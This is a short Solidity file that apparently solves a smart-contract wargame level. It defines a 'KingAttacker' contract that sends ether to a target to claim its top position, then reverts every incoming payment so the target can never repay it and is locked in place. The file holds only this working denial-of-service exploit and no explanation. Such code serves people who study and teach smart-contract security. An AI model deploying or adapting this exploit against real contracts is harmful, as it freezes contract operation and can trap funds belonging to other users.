// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract KingAttacker {
    constructor() {}

    function attack(address payable targetAddress) public payable {
        (bool sent,) = targetAddress.call{value: msg.value}("");
        require(sent, "Failed to sent");
    }

    fallback() external {
        revert();
    }
}
